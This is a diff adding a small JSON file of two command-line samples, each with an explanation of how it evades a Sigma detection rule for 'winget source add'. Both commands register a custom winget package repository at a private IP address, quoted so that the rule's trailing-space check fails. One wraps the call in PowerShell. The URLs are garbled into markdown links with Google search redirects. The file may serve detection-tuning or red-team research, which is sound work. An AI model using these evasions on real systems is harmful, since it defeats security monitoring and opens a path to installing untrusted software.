@@ -1,0 +1,10 @@
+[
+  {
+    "output": "winget.exe \"source\" \"add\" -n evader_repo -a \"[http://192.168.1.100/repo](https://www.google.com/search?q=http://192.168.1.100/repo)\"",
+    "explanation": "The Sigma rule explicitly checks for the strings 'source ' and 'add ' with trailing spaces. By encapsulating the arguments in double quotes, the parsed command line logged by the system will appear as '\"source\" \"add\"'. This structurally breaks the trailing space condition in the rule while remaining a valid and executable command for the winget engine."
+  },
+  {
+    "output": "powershell.exe -c \"$cmd='winget.exe'; $args=@('\"source\"', '\"add\"', '-n', 'test', '\"[http://10.10.10.10](https://www.google.com/search?q=http://10.10.10.10)\"'); & $cmd $args\"",
+    "explanation": "This approach uses PowerShell to pass arguments as an array of explicitly quoted strings to the winget executable. The resulting process creation event for winget.exe will contain quoted strings, bypassing the space-dependent detection logic in the Sigma 'contains|all' filter."
+  }
+]
